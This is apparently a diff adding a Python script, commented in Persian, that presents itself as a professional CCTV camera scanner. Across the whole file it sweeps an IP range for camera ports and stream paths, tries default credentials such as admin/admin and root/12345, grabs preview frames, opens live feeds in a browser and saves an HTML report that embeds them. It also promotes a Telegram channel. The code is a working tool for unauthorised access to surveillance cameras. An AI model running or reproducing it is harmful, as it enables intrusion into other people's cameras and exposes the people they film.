@@ -1,0 +1,194 @@
+import requests
+import socket
+import threading
+import time
+import webbrowser
+from urllib.parse import urlparse
+from colorama import Fore, Style, init
+import os
+import cv2
+import numpy as np
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# Initialize colorama
+init(autoreset=True)
+
+# تنظیمات حرفه‌ای
+CONFIG = {
+    "TELEGRAM_CHANNEL": "https://t.me/kalilinux_ghost",
+    "TIMEOUT": 3,
+    "MAX_THREADS": 100,
+    "AUTO_OPEN": True,
+    "PREVIEW": True,
+    "AUTH": {"admin": "admin", "root": "12345"},  # لیست اعتبارسنجی
+    "PORTS": {
+        80: {"type": "mjpeg", "paths": ["/video/mjpg", "/cameras/mjpg"]},
+        81: {"type": "http", "paths": ["/live"]},
+        554: {"type": "rtsp", "paths": ["/live.sdp", "/stream"]},
+        8000: {"type": "api", "paths": ["/ISAPI/Streaming"]},
+        8080: {"type": "jpg", "paths": ["/snapshot.jpg"]},
+        37777: {"type": "dahua", "paths": ["/cgi-bin/snapshot"]}
+    },
+    "USER_AGENTS": [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
+        "Mozilla/5.0 (Linux; Android 10; SM-G975F)"
+    ]
+}
+
+class UltimateCameraScanner:
+    def __init__(self):
+        self.live_feeds = []
+        self.session = requests.Session()
+        self.session.verify = False
+        self.lock = threading.Lock()
+        self.scan_stats = {
+            "scanned": 0,
+            "found": 0,
+            "start_time": time.time()
+        }
+
+    def get_random_agent(self):
+        import random
+        return {"User-Agent": random.choice(CONFIG["USER_AGENTS"])}
+
+    def try_auth(self, url):
+        """امتحان کردن اعتبارسنجی‌های مختلف"""
+        for username, password in CONFIG["AUTH"].items():
+            try:
+                auth_url = f"{url}?username={username}&password={password}"
+                response = self.session.get(auth_url, timeout=CONFIG["TIMEOUT"])
+                if response.status_code == 200:
+                    return auth_url
+            except:
+                continue
+        return url
+
+    def check_stream(self, ip, port, path):
+        """بررسی کیفیت استریم و نمایش پیش‌نمایش"""
+        url = f"http://{ip}:{port}{path}" if port != 80 else f"http://{ip}{path}"
+        auth_url = self.try_auth(url)
+        
+        try:
+            if CONFIG["PREVIEW"] and port in [80, 81, 8080]:
+                cap = cv2.VideoCapture(auth_url)
+                ret, frame = cap.read()
+                if ret:
+                    cv2.imshow(f'Camera {ip}', frame)
+                    cv2.waitKey(1000)
+                    cv2.destroyAllWindows()
+                    cap.release()
+                    return auth_url
+            else:
+                response = self.session.head(auth_url, timeout=CONFIG["TIMEOUT"])
+                if response.status_code == 200:
+                    return auth_url
+        except:
+            return None
+
+    def scan_port(self, ip, port, port_info):
+        """اسکن یک پورت خاص"""
+        results = []
+        for path in port_info["paths"]:
+            url = self.check_stream(ip, port, path)
+            if url:
+                with self.lock:
+                    self.scan_stats["found"] += 1
+                    self.live_feeds.append({
+                        "ip": ip,
+                        "port": port,
+                        "type": port_info["type"],
+                        "url": url,
+                        "time": time.strftime("%H:%M:%S")
+                    })
+                    print(f"{Fore.GREEN}🎥 دوربین فعال: {Fore.CYAN}{ip}:{port} {Fore.YELLOW}({port_info['type']})")
+                    print(f"{Fore.LIGHTBLUE_EX}🔗 لینک: {Style.BRIGHT}{url}")
+                    if CONFIG["AUTO_OPEN"]:
+                        webbrowser.open(url)
+                results.append(url)
+        return results
+
+    def scan_ip(self, ip):
+        """اسکن کامل یک IP"""
+        with ThreadPoolExecutor(max_workers=CONFIG["MAX_THREADS"]) as executor:
+            futures = []
+            for port, port_info in CONFIG["PORTS"].items():
+                futures.append(executor.submit(self.scan_port, ip, port, port_info))
+            
+            for future in as_completed(futures):
+                self.scan_stats["scanned"] += 1
+
+    def scan_range(self, ip_range, start, end):
+        """اسکن محدوده IP"""
+        print(f"\n{Fore.MAGENTA}🚀 شروع اسکن حرفه‌ای دوربین‌های مداربسته")
+        print(f"{Fore.CYAN}📢 کانال تلگرام: {CONFIG['TELEGRAM_CHANNEL']}")
+        
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            executor.map(self.scan_ip, [f"{ip_range}{i}" for i in range(start, end+1)])
+
+    def save_results(self):
+        """ذخیره نتایج با فرمت پیشرفته"""
+        if not os.path.exists("scans"):
+            os.makedirs("scans")
+            
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        filename = f"scans/camera_scan_{timestamp}.html"
+        
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>نتایج اسکن دوربین {timestamp}</title>
+    <style>
+        body {{ font-family: Arial; direction: rtl; }}
+        .camera {{ border: 1px solid #ddd; padding: 10px; margin: 10px; }}
+        .live {{ color: green; font-weight: bold; }}
+    </style>
+</head>
+<body>
+    <h1>نتایج اسکن دوربین‌های مداربسته</h1>
+    <p>تاریخ: {time.strftime("%Y/%m/%d %H:%M:%S")}</p>
+    <p>کانال تلگرام: <a href="{CONFIG['TELEGRAM_CHANNEL']}">{CONFIG['TELEGRAM_CHANNEL']}</a></p>
+    <hr>
+            """)
+            
+            for cam in self.live_feeds:
+                f.write(f"""
+    <div class="camera">
+        <h3>دوربین {cam['ip']}:{cam['port']}</h3>
+        <p>نوع: {cam['type']}</p>
+        <p>زمان شناسایی: {cam['time']}</p>
+        <p class="live">لینک زنده: <a href="{cam['url']}" target="_blank">{cam['url']}</a></p>
+        <iframe src="{cam['url']}" width="640" height="480" frameborder="0"></iframe>
+    </div>
+                """)
+            
+            f.write("</body></html>")
+        
+        print(f"\n{Fore.GREEN}💾 گزارش کامل در {filename} ذخیره شد")
+
+    def show_stats(self):
+        """نمایش آمار نهایی"""
+        elapsed = time.time() - self.scan_stats["start_time"]
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"{Fore.LIGHTYELLOW_EX}🔎 اسکن کامل شد!")
+        print(f"⏱ زمان اجرا: {elapsed:.2f} ثانیه")
+        print(f"🔌 پورت‌های اسکن شده: {self.scan_stats['scanned']}")
+        print(f"📡 دوربین‌های فعال یافت شده: {self.scan_stats['found']}")
+        print(f"{Fore.MAGENTA}📢 کانال تلگرام: {CONFIG['TELEGRAM_CHANNEL']}")
+        print(f"{Fore.CYAN}{'='*60}")
+
+if __name__ == "__main__":
+    print(f"\n{Fore.BLUE}{'='*70}")
+    print(f"{Fore.LIGHTYELLOW_EX}🔥🔥 اسکنر فوق حرفه‌ای دوربین مداربسته v5.0 🔥🔥")
+    print(f"{Fore.BLUE}{'='*70}")
+    
+    ip_range = input("\n🌐 محدوده IP را وارد کنید (مثال: 192.168.1.): ").strip()
+    start_ip = int(input("شماره IP شروع (پیش‌فرض=1): ") or 1)
+    end_ip = int(input("شماره IP پایان (پیش‌فرض=255): ") or 255)
+    
+    scanner = UltimateCameraScanner()
+    scanner.scan_range(ip_range, start_ip, end_ip)
+    scanner.save_results()
+    scanner.show_stats()
